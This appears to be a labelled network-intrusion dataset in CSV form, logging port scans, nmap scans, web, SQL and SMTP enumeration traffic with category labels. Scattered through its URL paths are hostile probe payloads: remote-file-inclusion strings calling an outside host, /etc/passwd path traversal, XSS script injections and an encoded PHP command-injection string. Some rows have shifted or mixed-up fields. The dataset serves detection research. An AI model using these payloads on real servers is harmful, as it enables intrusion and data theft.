@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/doc/Judy/demo/funhist.c,Mozilla/5.00,0,0,web_enumeration,1
1666690179,192.168.34.11,53116,192.168.33.12,0,HTTP,0,0,0,/forum0ra.asp,0,0,0,web_enumeration,2
1666691931,100.64.19.103,45166,100.64.19.22,1974,TCP,0,0,0,0,0,0,0,port_scan,3
1666691984,10.32.4.176,54244,10.132.100.53,5904,TCP,0,0,0,0,0,0,0,port_scan,0
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/work/,Mozilla/5.00,0,0,web_enumeration,1
1666691985,10.32.4.176,51980,10.132.100.53,27353,TCP,0,0,0,0,0,0,0,port_scan,0
1666591407,10.0.0.20,33902,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT  t.term_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id
			WHERE tt.taxonomy IN ('wp_theme') AND t.name IN ('twentytwenty')
			
			LIMIT 1",sql_enumeration,0
1666700285, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580400,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ad_main.php?_mygamefile=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53114,192.168.33.12,0,HTTP,0,0,0,/manager/,0,0,0,web_enumeration,2
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,302,/logout.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692058,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692057,10.32.4.176,57986,10.132.100.52,543,TCP,0,0,0,0,0,0,0,port_scan,0
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/adv/gm001-mc/,Mozilla/5.00,0,0,web_enumeration,1
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582472,192.168.207.142,0,0,0,HTTPS,GET,0,404,/software/,Mozilla/5.00,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48468,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Upload/install.php?skindir=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666582482,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sources/functions.php?CONFIG[main_path]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591407,10.0.0.20,33902,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666582463,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Administration,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591757,10.0.0.22,0,10.0.0.21,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666695330, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582480,192.168.207.142,0,0,0,HTTPS,GET,0,404,/list.php?phpbb_root_path=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1664429530,0,0,0,0,tcp,0,0,0,0,0,0,0,port_scan,0
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582466,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192168207.sql,Mozilla/5.00,0,0,web_enumeration,1
1666691984,10.32.4.176,35446,10.132.100.53,8333,TCP,0,0,0,0,0,0,0,port_scan,0
1666691984,10.32.4.176,33926,10.132.100.53,1021,TCP,0,0,0,0,0,0,0,port_scan,0
1666692118,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580396,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cfdocs/exampleapp/publish/admin/addcontent.cfm,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/vbscripts,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691945,100.64.19.103,37478,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/temp,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692057,10.32.4.176,38530,10.132.100.52,8400,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/javascript,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/167.tar,Mozilla/5.00,0,0,web_enumeration,1
1666692057,10.32.4.176,57782,10.132.100.52,3889,TCP,0,0,0,0,0,0,0,port_scan,0
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/functions.php?set_path=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/gif/hp_invent_logo.gif,Mozilla/5.00,0,0,web_enumeration,1
1666541566,127.0.0.1,58427,127.0.0.1,58426,2022-10-24 00:12:16 ALLOW TCP 127.0.0.1 127.0.0.1 58427 58426 0 - 0 0 0 - - - SEND 16320,TCP,0,0,0,0,0,0,port_scan,3
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/modules/links/blocks/links.php?system[path]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666542079,0,53913,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666582487,192.168.207.142,0,0,0,HTTPS,GET,0,404,/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW?p_arg_names=_max_levels&p_arg_values=1&p_arg_names=_start_with_field&p_arg_values=null&p_arg_names=_start_with_value&p_arg_values=:p_start_with_value%27,Mozilla/5.00,0,0,web_enumeration,1
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/alpha.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666704530, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,404,/music/buycd.php?HTTP_DOCUMENT_ROOT=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666700822, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666541373,0,53480,23.200.24.56,443,0,0,0,0,0,0,0,0,port_scan,0
1666582470,192.168.207.142,0,0,0,HTTPS,GET,0,404,/pub/english.cgi?op=rmail,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/route,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591350,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691946,100.64.19.103,37628,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591487,10.0.0.20,33972,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES utf8mb4,sql_enumeration,0
1666691983,10.32.4.176,43672,10.132.100.53,49175,TCP,0,0,0,0,0,0,0,port_scan,0
1666531286,192.168.0.3,0,0,0,0,0,0,0,0,0,0,0,smtp_enumeration,1
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/wordpress,Mozilla/5.00,0,0,web_enumeration,1
1666590947,10.0.0.20,33508,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-comments' LIMIT 1,sql_enumeration,0
1666692038,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666590687,10.0.0.20,33286,10.0.0.21,3306,mysql,0,0,0,0,0,SET,"SET SESSION sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'",sql_enumeration,0
1666690179,192.168.34.11,53138,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666692082,10.132.100.52,22,10.32.4.176,40080,TCP,0,0,0,0,0,0,0,port_scan,0
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/mindmeld/acweb/admin_index.php?MM_GLOBALS[home]=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666542072,0,53752,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666542079,192.168.106.1,61560,192.168.106.130,53,2022-10-24 00:21:04 ALLOW UDP 192.168.106.1 192.168.106.130 61560 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/textcounter.pl,0,0,0,web_enumeration,2
1666582487,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Telerik.Web.UI.DialogHandler.aspx?dp=////,Mozilla/5.00,0,0,web_enumeration,1
1666542056,0,50801,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/group,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692146,10.132.100.52,80,10.32.4.176,43526,TCP,0,0,0,0,0,0,0,port_scan,0
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691932,100.64.19.103,45554,100.64.19.22,8383,TCP,0,0,0,0,0,0,0,port_scan,3
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666590590,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/console,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690179,192.168.34.11,53234,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/utm/utm_stat,0,0,0,web_enumeration,2
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,404,/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif,Mozilla/5.00,0,0,web_enumeration,1
1666542079,192.168.106.1,50767,192.168.106.130,53,2022-10-24 00:20:57 ALLOW UDP 192.168.106.1 192.168.106.130 50767 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666691954,100.64.19.103,43532,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692057,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666590840,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666591817,10.0.0.20,34248,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT @@SESSION.sql_mode,sql_enumeration,0
1666704551, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1664428840,192.168.91.128,58654,192.168.91.1,167,tcp,0,0,0,0,0,0,0,port_scan,2
1666541373,0,53461,8.247.49.252,443,0,0,0,0,0,0,0,0,port_scan,0
1664373559,192.168.91.15,137,192.168.91.255,137,UDP,0,0,0,0,0,0,0,port_scan,2
1666690178,192.168.34.11,53114,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666542072,0,53776,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666691982,10.32.4.176,47324,10.132.100.53,1031,TCP,0,0,0,0,0,0,0,port_scan,0
1666591230,0,0,10.0.0.22,5044,0,0,0,0,0,0,0,0,sql_enumeration,0
1666591967,10.0.0.22,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/_functions.php?prefix=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692056,10.32.4.176,51616,10.132.100.52,901,TCP,0,0,0,0,0,0,0,port_scan,0
1666631334,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/pls/simpledad/admin_/dadentries.htm,Mozilla/5.00,0,0,web_enumeration,1
1666692102,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/LvAjqjtV.SSIFilter,Mozilla/5.00,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580396,192.168.207.142,0,0,0,HTTPS,GET,0,404,/guestbook/,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sdk.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692133,10.132.101.52,45350,10.132.101.101,445,TCP,0,0,0,0,0,0,0,port_scan,0
1666691973,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580402,192.168.207.142,0,0,0,HTTPS,GET,0,404,/es_offer.php?files_dir=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692057,10.32.4.176,35248,10.132.100.52,9100,TCP,0,0,0,0,0,0,0,port_scan,0
1666541343,0,53245,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666580402,192.168.207.142,0,0,0,HTTPS,GET,0,404,/example-view/templates/dates_list.php?globals[content_dir]=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192168207167.tar,Mozilla/5.00,0,0,web_enumeration,1
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/single,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666704181, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum1.asp,0,0,0,web_enumeration,2
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/files/folders.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666722169, 172.24.2.11 ,0,172.24.2.100,0,HTTP,GET,0,404,/chinese,gobuster/3.2.0-dev,0,0,web_enumeration,3
1666691985,10.32.4.176,39538,10.132.100.53,4443,TCP,0,0,0,0,0,0,0,port_scan,0
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1664429500,0,0,0,0,tcp,0,0,0,0,0,0,0,port_scan,0
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/xmlrpc.php,Mozilla/5.00,0,0,web_enumeration,1
1666712777, 10.0.0.3,8000,57856,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/resources.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666542079,0,61319,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666690179,192.168.34.11,53232,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666690178,192.168.34.11,53114,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666591750,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666542079,0,61386,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666582476,192.168.207.142,0,0,0,HTTPS,GET,0,404,/jsp-examples/jsp2/jspx/textRotate.jspx?name=<script>alert(111)</script>,Mozilla/5.00,0,0,web_enumeration,1
1666692058,10.32.4.176,57936,10.132.100.52,10012,TCP,0,0,0,0,0,0,0,port_scan,0
1666591040,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666630913,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666590990,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666542682,192.168.1.254,33947,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666541306,0,60312,192.168.1.254,53,0,0,0,0,0,0,0,0,port_scan,3
1664428770,192.168.91.128,35310,192.168.91.1,69,tcp,0,0,0,0,0,0,0,port_scan,2
1666582486,192.168.207.142,0,0,0,HTTPS,GET,0,404,/wu-moadmin.php,Mozilla/5.00,0,0,web_enumeration,1
1666704315, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692064,10.32.4.176,46342,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/simple,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692058,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692082,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/magic.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591787,10.0.0.20,34224,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'",sql_enumeration,0
1664429510,192.168.91.128,35518,192.168.91.1,3,tcp,0,0,0,0,0,0,0,port_scan,2
1666582471,192.168.207.142,0,0,0,HTTPS,GET,0,404,/modules/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,Mozilla/5.00,0,0,web_enumeration,1
1666582476,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ky/,Mozilla/5.00,0,0,web_enumeration,1
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53234,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/ncommerce3/ExecMacro/macro.d2w/\\x0a\\x0a,0,0,0,web_enumeration,2
1666631056,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691981,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/.hg/requires,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666630589,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691930,100.64.19.103,44168,100.64.19.22,1248,TCP,0,0,0,0,0,0,0,port_scan,3
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cms/meetweb/classes/RegResource.class.php?root_path=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/install,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712777, 10.0.0.3,4444,45882,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691931,100.64.19.103,50366,100.64.19.22,1148,TCP,0,0,0,0,0,0,0,port_scan,3
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666631089,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691931,100.64.19.103,49602,100.64.19.22,14441,TCP,0,0,0,0,0,0,0,port_scan,3
1666591537,10.0.0.20,34012,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))
					
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 10",sql_enumeration,0
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/wwwthreads/3tvars.pm,0,0,0,web_enumeration,2
1666692037,10.132.100.53,445,10.32.4.176,41544,TCP,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/shoutbox/expanded.php,0,0,0,web_enumeration,2
1666580404,192.168.207.142,0,0,0,HTTPS,GET,0,404,/plugins/spamx/MailAdmin.Action.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666590980,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666690179,192.168.34.11,53138,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum/member.php,0,0,0,web_enumeration,2
1666580404,192.168.207.142,0,0,0,HTTPS,GET,0,404,/php-inc/log.inc.php?SKIN_URL=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/stylesheets.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580404,192.168.207.142,0,0,0,HTTPS,GET,0,404,/pafiledb/includes/pafiledb_constants.php?module_root_path=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692037,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542079,0,50778,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cms/typo3conf/database.sql,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1664429510,192.168.91.128,50444,192.168.91.1,8,tcp,0,0,0,0,0,0,0,port_scan,2
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cron.php?include_path=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ne,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591797,10.0.0.20,34232,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-comments' LIMIT 1,sql_enumeration,0
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;,Mozilla/5.00,0,0,web_enumeration,1
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691983,10.32.4.176,46980,10.132.100.53,8290,TCP,0,0,0,0,0,0,0,port_scan,0
1666580400,192.168.207.142,0,0,0,HTTPS,GET,0,404,/tc/,Mozilla/5.00,0,0,web_enumeration,1
1666697548, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591909,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692065,10.32.4.176,52270,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
